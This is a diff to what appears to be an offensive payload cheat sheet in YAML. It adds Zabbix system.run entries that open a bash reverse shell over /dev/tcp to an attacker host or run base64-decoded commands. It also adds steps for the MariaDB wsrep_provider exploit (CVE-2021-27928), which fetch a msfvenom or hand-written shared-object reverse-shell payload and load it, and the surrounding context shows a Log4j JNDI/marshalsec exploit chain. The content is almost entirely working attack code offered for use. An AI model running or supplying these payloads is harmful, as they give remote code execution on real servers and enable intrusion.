@@ -1473,7 +1473,7 @@ payload:
       # Commands To Run
       -> Run javac Exploit.java -source 8 -target 8
       -> Run python3 -m http.server 80 in the directory of Exploit.java
-      -> RUN java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{IP}/#Exploit" (Listening Port 1389)
+      -> RUN java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{IP}/#Exploit" (Listening Port)
     - |
       # Exploit (Save as Exploit.java)
       public class Exploit {
@@ -1509,16 +1509,37 @@ payload:
       }
     - |
       {LOG4J}
+  zabbix:      
+    - |
+      # Create Item > Put inside Key
+      system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",nowait]      
+    - |
+      # Create Item > Put inside Key
+      system.run[echo {BASE64} | base64 -d | bash,nowait]
+  mysql:
+    - |
+      # CVE-2021-27928
+      # References : https://github.com/Al1ex/CVE-2021-27928
+      # Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL
+
+      1. msfvenom -p linux/x64/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f elf-so -o shell.so
+      2. python3 -m http.server 80
+      3. curl {IP}/shell.so -o /tmp/shell.so
+      4. mysql -u root -p'root' -e 'SET GLOBAL wsrep_provider="/tmp/shell.so"'
+    - |
+      1. Save code below as shell.c
+
+      #include <stdio.h>
+      #include <sys/types.h>
+      #include <stdlib.h>
+      void _init() {
+          system("echo {BASE64} | base64 -d | bash");
+      }      
       
-      
-      
-      
-      
-      
-      
-      
-      
-      
+      2. gcc -fPIC -shared -nostartfiles -o shell.so shell.c
+      3. python3 -m http.server 80
+      4. curl {IP}/shell.so -o /tmp/shell.so
+      5. mysql -u root -p'root' -e 'SET GLOBAL wsrep_provider="/tmp/shell.so"'
       
       
       
